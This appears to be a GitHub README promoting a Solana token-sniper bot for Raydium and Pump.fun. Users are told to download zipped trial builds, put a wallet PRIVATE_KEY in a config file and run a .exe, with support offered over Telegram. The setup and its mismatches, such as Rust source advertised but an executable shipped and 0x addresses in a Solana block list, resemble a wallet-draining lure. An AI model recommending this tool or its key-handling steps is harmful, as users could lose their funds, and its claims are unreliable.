# Solana Ultra-Fast New Token Sniper on Raydium and Pump.fun in Rust 🚀

## Overview

Introducing the **Solana Ultra-Fast New Token Sniper** written in **Rust** 🦀, designed to detect newly launched tokens on both **Raydium** and **Pump.fun** and execute buys at lightning speed ⚡. With Rust's memory safety features and performance optimizations, built with Rust for superior performance and security. Tailored for both novice and experienced traders.

---

## Key Features

### 🚀 Speed and Efficiency
- **Lightning-Quick Transactions**: Leveraging Rust's exceptional performance, our bot allows you to snipe new tokens almost instantly. Say goodbye to delays and seize opportunities as they arise!

### 🔒 Safety First
- **Robust Security**: Rust's safety guarantees minimize bugs and vulnerabilities, ensuring your trading activities are secure. Trade with confidence and peace of mind.

### 📊 Multiple gRPC Connections
- **Stay Updated**: Effortlessly connect to top Solana data providers like **Helius** and **Yellowstone** through multiple gRPC connections. Get real-time updates and make informed trading decisions.

### 👩‍💻 User-Friendly Interface
- **Intuitive Design**: Our sniper bot features a clean and accessible interface, making it easy for users of all experience levels to navigate. Start trading in no time!

### 🛠️ Rich Utilities
- **Advanced Features**:
  - **jito-confirm**: Engage in low-latency transactions on platforms like Raydium and Pumpfun.
  - **jito-bundle**: Bundle buy/sell actions with up to **20 wallets** in Raydium/Pumpfun, enhancing your trading strategy and flexibility.

---

## Directory Structure

```
src/
├── core/
│   ├── token.rs        # Token definitions and handling
│   └── tx.rs        # Transaction handling
| 
├── engine/
│   ├── swap.rs        # Token swap(buy/sell) functionalities in various Dexs
│   └── monitor        # New token monitoring(and parse tx) in Dexs using geyser rpc, and normal rpc
│       └── helius.rs        # Helius gRpc for tx listen and parse.
│       └── yellowstone.rs        # Yellowstone gRpc for tx listen and parse.
|
├── dex/
│   ├── pump_fun.rs        # Pump.fun
│   ├── raydium.rs        # Raydium
│   ├── meteora.rs        # Meteora
│   └── orca.rs        # Orca
│
├── services/
│   ├── jito.rs        # Jito service provides ultra-fast transaction confirmation
│   └── nextblock.rs        # NextBlock service provides the ultra-fast transaction confirmation in unique way
|
├── common/
│   ├── logger.rs        # Logs to be clean and convenient to monitor.
│   └── utils.rs        # Utility functions used across the project
│
├── lib.rs
└── main.rs
```
---
## Trial Versions
### Trading Strategies
> 🗂️ [solana-raypump-sniper(executioner-trial).zip](https://github.com/user-attachments/files/18854180/solana-raypump-sniper.executioner-trial.zip)

1. Monitor for user purchases of $1,000 tokens; execute a buy order at that point.
2. Monitor for user sales of $300 tokens; execute a sell order at that point.
3. If a position remains open for more than 60 seconds, initiate an automatic sell.
(Note: Both the $1,000 and $300 thresholds, as well as the 60-second time frame, are adjustable parameters.)

> 🗂️ [solana-raypump-sniper(qwert-trial).zip](https://github.com/user-attachments/files/18854181/solana-raypump-sniper.qwert-trial.zip)

1.  **Entry:**  Enter a position based on your position.
2.  **Time Limit:** A time limit of 3-5 minutes is set after entering a position. During this time, monitor the volume and the number of transactions.
3.  **Exit - Time-Based (3 Minute Exit):** If the volume does not increase after 3 minutes, sell.
4.  **Exit - Growth Activated:** If volume growth begins, the time-based rule is disabled.
    *   **Take Profit (TP):** Set 5-7 Take Profit orders.
    *   **Stop Loss (SL):** Set a Stop Loss at 50% below the entry price.

### How To Run
1. Environment Variables Settings
```plaintext
PRIVATE_KEY=your_private_key_here
RPC_HTTPS=https://mainnet.helius-rpc.com/?api-key=your_api_key_here
RPC_WSS=wss://atlas-mainnet.helius-rpc.com/?api-key=your_api_key_here
DEVNET_RPC_HTTPS=https://devnet.helius-rpc.com/?api-key=your_api_key_here
RAYDIUM_LPV4=675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8
SLIPPAGE=10
JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
JITO_TIP_STREAM_URL=ws://bundles-api-rest.jito.wtf/api/v1/bundles/tip_stream
JITO_TIP_PERCENTILE=50
YELLOWSTONE_RPC_HTTP=http://elite.rpc.solanavibestation.com/?api_key=your_api_key_here
YELLOWSTONE_RPC_WSS=ws://elite.rpc.solanavibestation.com/?api_key=your_api_key_here
JITO_TIP_VALUE=0.004
BUY_THRESHOLD=1000
SELL_THRESHOLD=300
TIME_EXCEED=60
TOKEN_AMOUNT=0.000001
```
2. Add the wallet address you want to block on a new line and save the file.
```
0x1234567890abcdef1234567890abcdef12345678
0xabcdef1234567890abcdef1234567890abcdef12
```
3. Run `solana-raypump-sniper(trial).exe`.

![image](https://github.com/user-attachments/assets/dffc8e4b-cd00-4921-8488-e25230f4a31a)

---
## Donate

👉👌 6vT7nrqtbXDWVc8cRUtifxgfDZi19aW7qhcZg2hSepwb

---
## Support

For support and further inquiries, please connect via Telegram: 📞 [jwest951227](https://t.me/jwest951227).

## Scam Report

https://github.com/Solana-Sniper-Bot-Download/Solana-Raydium-Pumpfun-Sniper-Bot/issues/2
